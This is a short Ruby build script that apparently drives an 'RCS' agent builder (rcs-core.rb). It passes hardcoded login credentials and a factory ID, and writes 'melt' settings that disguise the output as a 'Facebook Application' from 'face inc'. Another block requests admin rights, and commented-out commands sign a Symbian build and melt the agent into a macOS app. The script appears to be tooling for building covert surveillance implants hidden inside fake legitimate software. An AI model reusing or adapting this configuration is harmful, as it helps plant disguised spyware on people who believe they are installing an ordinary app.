#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000757'
PLATFORM = 'anon'
DB = '127.0.0.1'
DEMO = false

ver = DEMO ? '_demo' : ''

###################################################################################################
params = {platform: PLATFORM,
          binary: {demo: DEMO},
          melt: {appname: 'facebook',
                 name: 'Facebook Application',
                 desc: 'Applicazione utilissima di social network',
                 vendor: 'face inc',
                 version: '1.2.3'},
          package: {type: 'local'}
          }

params = {platform: PLATFORM,
          binary: {demo: DEMO},
          melt: {admin: true}
          }
           
                    
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P 4444 -f #{FACTORY} -b build.json -o #{PLATFORM}#{ver}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
###################################################################################################
